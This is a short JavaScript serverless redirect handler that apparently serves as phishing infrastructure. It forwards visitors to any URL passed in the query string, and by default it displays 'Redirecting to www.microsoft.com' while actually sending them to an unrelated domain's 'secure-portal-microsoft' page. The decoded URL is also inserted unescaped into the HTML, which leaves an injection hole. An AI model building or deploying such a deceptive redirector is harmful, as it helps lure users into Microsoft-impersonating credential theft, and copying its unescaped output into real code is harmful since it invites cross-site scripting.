module.exports = (req, res) => {
    // Get the query parameter 'url' from the request
    const encryptedUrl = req.query.url;

    // Default link to redirect to (in case no URL is provided)
    const defaultUrl = 'https://tasfirm.com/secure-portal-microsoft/secure-page.html/';

    // If the 'url' query parameter is provided
    if (encryptedUrl) {
        try {
            // Decode the URL (the encrypted URL)
            const decodedUrl = decodeURIComponent(encryptedUrl);

            // Validate the decoded URL (optional step for extra security)
            try {
                new URL(decodedUrl); // This will throw an error if the URL is invalid
            } catch (e) {
                return res.status(400).send('Bad Request: Invalid URL format.');
            }

            // Send the loading page with the target URL embedded
            res.send(`
                <!DOCTYPE html>
                <html>
                <head>
                    <meta http-equiv="refresh" content="2;url=${decodedUrl}">
                    <title>Redirecting...</title>
                </head>
                <body>
                    <p>Loading...</p>
                    <!-- You could include the full loading HTML here -->
                </body>
                </html>
            `);
        } catch (err) {
            // If there is an error decoding the URL, send a bad request response
            res.status(400).send('Bad Request: Invalid URL encoding.');
        }
    } else {
        // If no 'url' query parameter is provided, redirect to the default URL
        res.send(`
            <!DOCTYPE html>
            <html>
            <head>
                <meta http-equiv="refresh" content="2;url=${defaultUrl}">
                <title>Redirecting...</title>
            </head>
            <body>
                <p>Redirecting to www.microsoft.com in 2 seconds...</p>
                <!-- You could include the full loading HTML here -->
            </body>
            </html>
        `);
    }
};

